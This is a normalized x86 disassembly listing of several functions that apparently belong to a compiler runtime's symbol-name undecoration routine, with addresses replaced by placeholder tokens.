jmp r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0x5f
jne r-xdata
dec eax
dec eax
je r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call sub_430114
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x60
lea ecx [ ebp - 0x58 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
push 0x27
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_42d52f
push esi
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx + 0x2 ] 0x3f
jne r-xdata
sub eax 0x8
push esi
je r-xdata
call sub_42d4e7
mov [ rw-data ] eax
push esi
lea eax [ ebp - 0xb0 ]
push eax
push ebx
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_42e82d
add esp 0xc
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
push 0x5d
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea eax [ ebp - 0x70 ]
inc ecx
push 0x1
push eax
mov [ rw-data ] ecx
call sub_42ef5a
add esp 0xc
mov ecx eax
call sub_42d7ab
mov ecx eax
call sub_42d4e7
mov [ ebp + 0xb ] 0x1
jmp r-xdata
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
call sub_42df4d
pop ecx
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx eax
sub_430639
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov cl [ eax ]
sub esp 0x38
test cl cl
jne r-xdata
cmp cl 0x36
jl r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
mov eax [ ebp + 0x8 ]
add esp 0xc
leave
retn
cmp cl 0x5f
je r-xdata
cmp cl 0x39
jle r-xdata
push ebx
movsx ebx cl
sub ebx 0x36
inc eax
mov [ rw-data ] eax
cmp ebx 0x29
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
test ebx ebx
js r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
or ebx 0xffffffff
cmp ebx 0x3
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
mov eax [ ebp + 0x8 ]
add esp 0xc
jmp r-xdata
movsx ebx cl
sub ebx 0x3d
inc eax
mov [ rw-data ] eax
cmp ebx 0x4
jl r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0xffff0000
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x4 ]
mov edi ebx
and edi 0x2
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
pop ebx
leave
retn
cmp ebx 0x7
jmp r-xdata
test bl 0x4
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
jle r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_42ccad
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
call sub_430382
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_42d3d4
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_42c890
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_42d3d4
pop ecx
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_42f3be
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_42c890
call sub_42f3be
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x30 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
push 0x1
call sub_42ccad
mov ecx eax
call sub_42d4e7
jmp r-xdata
cmp al 0x40
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
push ebx
push 0x8
mov ecx rw-data
call sub_42c6f8
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_42d52f
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
xor esi esi
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ebx
mov esi eax
jmp r-xdata
pop edi
pop esi
call sub_42cbd2
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_42c890
jmp r-xdata
call sub_42cbd2
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_42cf69
lea eax [ ebp - 0x38 ]
push eax
call sub_42da25
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x30 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_42d52f
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
mov eax [ rw-data ]
and eax 0x60
cmp al 0x60
je r-xdata
call sub_42db05
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_42c890
call sub_42db05
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
mov ecx [ ebp + 0x8 ]
push 0x3
call sub_42ccad
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
cmp esi ebx
je r-xdata
sub_430a18
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
mov al [ eax ]
push ebx
push esi
mov esi 0xffff0000
and [ ebp - 0x38 ] esi
push edi
xor edi edi
mov [ ebp - 0x1 ] 0x0
test al al
je r-xdata
cmp [ ebp + 0x18 ] edi
jne r-xdata
cmp al 0x24
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
mov esi [ ebp + 0xc ]
cmp [ esi ] edi
je r-xdata
mov ecx [ rw-data ]
mov al [ ecx ]
xor edx edx
cmp al 0x41
setl dl
and [ ebp - 0x10 ] esi
movsx ebx al
mov [ ebp - 0x1c ] edi
dec edx
and edx 0x2b
add edx 0x16
sub ebx edx
xor edx edx
and [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] edx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_42db8f
mov ecx [ ebp - 0x2c ]
add esp 0x10
cmp ecx edi
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] edi
je r-xdata
test [ esi + 0x4 ] 0x100
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x28 ]
push eax
jmp r-xdata
push esi
mov eax [ ebp + 0x14 ]
cmp [ eax ] edi
je r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
cmp [ eax ] 0x24
jne r-xdata
shr eax 0x11
not eax
test al 0x1
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
sub eax 0x3
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_42ccad
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x38 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] eax
call sub_42d52f
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
call sub_42d4e7
jmp r-xdata
mov ecx [ rw-data ]
mov al [ ecx ]
xor edx edx
cmp al 0x41
setl dl
movsx ebx al
dec edx
and edx 0x2b
add edx 0x16
sub ebx edx
mov edx [ ebp - 0x14 ]
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_42db8f
mov ecx [ ebp - 0x34 ]
add esp 0x10
test ecx ecx
jne r-xdata
test edx edx
je r-xdata
test edi edi
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x8
mov eax [ ebp - 0x10 ]
push 0x20
lea ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
call sub_42d52f
push 0x8
call sub_42c6d9
add esp 0x4
push eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0xc ]
push 0xa
call sub_42c6d9
add esp 0x4
push eax
lea ecx [ ebp - 0x1c ]
call sub_42d39f
mov edi [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x20
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] eax
call sub_42d52f
push 0xa
call sub_42c6d9
add esp 0x4
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_42d7cf
mov edi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp ebx 0x1f
ja r-xdata
inc ecx
mov [ rw-data ] ecx
test edx edx
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov esi [ ebp + 0x10 ]
push esi
lea ecx [ ebp - 0xc ]
call sub_42d09f
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_42d2c8
cmp [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
je r-xdata
push 0x9
jmp r-xdata
mov eax [ ebp - 0x10 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] eax
call sub_42d52f
push 0x9
call sub_42c6d9
add esp 0x4
push eax
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x2c ]
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x20 ] ecx
push 0x20
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
call sub_42d52f
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_42d2c8
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call sub_42c6d9
add esp 0x4
push eax
lea ecx [ ebp - 0x14 ]
call sub_42d39f
push eax
call sub_42d7cf
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] eax
jmp r-xdata
test bl 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] eax
call sub_42d52f
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_42d2c8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
mov eax ebx
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
test bl 0x2
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_42f3be
pop ecx
push eax
lea ecx [ ebp - 0xc ]
call sub_42c890
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
lea eax [ ebp - 0xc ]
push eax
je r-xdata
test bl 0x1
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_42f3be
pop ecx
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x1
lea ecx [ ebp - 0xc ]
call sub_42cfad
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_430382
pop ecx
push eax
lea ecx [ ebp - 0xc ]
call sub_42c890
lea eax [ ebp - 0x3c ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_42ccad
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_430382
pop ecx
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
xor edx edx
mov ebx 0x100
cmp [ ebp + 0x18 ] edx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
inc [ rw-data ]
cmp al 0x40
jne r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
or ecx ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
cmp [ esi ] edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
or ecx 0x2000
mov eax [ ebp + 0x14 ]
cmp [ eax ] edx
je r-xdata
mov ecx [ esi + 0x4 ]
test ebx ecx
jne r-xdata
push eax
test ecx 0x800
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] edx
je r-xdata
push esi
jmp r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x38 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] eax
call sub_42d52f
push esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_42d4e7
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_42d2c8
sub_430fb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp - 0xc ]
mov edx 0xffff0000
and [ ebp - 0x4 ] edx
xor ecx ecx
and [ ebp - 0x8 ] ecx
and eax edx
mov edx [ rw-data ]
test edx edx
je r-xdata
cmp al 0x3
jne r-xdata
cmp [ edx ] 0x3f
jne r-xdata
cmp al 0x2
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x20 ]
push eax
call sub_430114
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov al [ edx + 0x1 ]
cmp al 0x40
jne r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
call sub_42d39f
test [ rw-data ] 0x1000
jne r-xdata
cmp al 0x24
jne r-xdata
add [ rw-data ] 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_430114
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
push eax
call sub_42ccf2
mov eax [ rw-data ]
mov edx eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
push 0x0
push eax
call sub_42ee03
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp al 0x2
jne r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
mov [ rw-data ] eax
add eax 0x7
and eax 0xfffffff8
push eax
call [ rw-data ]
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
cmp cl 0x20
jne r-xdata
mov al cl
mov [ edx ] al
mov eax [ rw-data ]
leave
retn
mov [ edx ] cl
inc edx
inc eax
inc eax
mov [ edx ] cl
inc edx
jmp r-xdata
cmp [ eax ] 0x20
je r-xdata
inc eax
jmp r-xdata
sub_4310f6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov al [ eax ]
push ebx
xor ebx ebx
push esi
cmp al bl
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_42ccad
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_42d581
mov esi [ ebp + 0xc ]
cmp [ esi ] ebx
je r-xdata
cmp al 0x36
jl r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi ] ebx
je r-xdata
push esi
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
cmp al 0x5f
jne r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
pop edi
cmp [ esi ] ebx
je r-xdata
mov esi [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push [ ebp + 0x10 ]
push eax
call sub_430a18
xor eax eax
cmp [ esi ] 0x2a
sete al
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_42e520
add esp 0x20
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_42d09f
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
cmp [ eax ] ebx
je r-xdata
push edi
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_42d52f
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_430639
pop ecx
pop ecx
push esi
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
test [ esi + 0x4 ] 0x100
jne r-xdata
sub_43124d
push 0x64
push r--data
call sub_4278c0
mov edi [ ebp + 0x14 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x5
call sub_42b0a4
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x5
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edi
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
movzx eax [ ebp + 0x1c ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_42cb2a
lea ecx [ ebp - 0x74 ]
call sub_430fb7
mov [ ebp - 0x1c ] eax
mov ecx rw-data
call sub_42c097
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4312de
mov eax [ ebp - 0x1c ]
call sub_427905
retn
sub_4312e7
push 0x64
push r--data
call sub_4278c0
mov edi [ ebp + 0x14 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x5
call sub_42b0a4
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x5
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edi
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_42cb2a
lea ecx [ ebp - 0x74 ]
call sub_430fb7
mov [ ebp - 0x1c ] eax
mov ecx rw-data
call sub_42c097
mov [ ebp - 0x4 ] 0xfffffffe
call sub_431378
mov eax [ ebp - 0x1c ]
call sub_427905
retn
sub_431381
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov al [ eax ]
sub esp 0x24
push ebx
push esi
push edi
test al al
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
add esp 0xc
inc [ rw-data ]
and [ ebp - 0xc ] 0x0
movzx edi al
mov esi 0xffff0000
and [ ebp - 0x8 ] esi
mov eax edi
or ebx 0xffffffff
mov [ ebp - 0x1 ] 0x0
cmp eax 0x4e
jg r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_42d39f
jle r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_42d581
sub eax 0x43
cmp eax 0xa
ja r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] esi
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp ebx 0xfffffffe
jne r-xdata
mov eax edi
sub eax 0x43
je r-xdata
lea eax [ ebp - 0x24 ]
jmp r-xdata
cmp eax 0x53
jle r-xdata
movzx eax [ eax + lookup_table_431739 ]
jmp [ eax * 4 + jump_table_431721 ]
cmp [ eax ] 0x0
jne r-xdata
push r--data
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
mov esi 0x800
or [ ebp - 0x10 ] esi
push eax
call sub_4310f6
add esp 0x10
test [ ebp - 0x18 ] esi
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
push 0x2
pop ecx
sub eax ecx
je r-xdata
dec [ rw-data ]
push eax
call sub_42f264
mov edx [ eax + 0x4 ]
pop ecx
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
mov ebx edi
and ebx 0x3
jmp r-xdata
cmp eax 0x58
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_4310f6
add esp 0x10
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_42d581
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
push eax
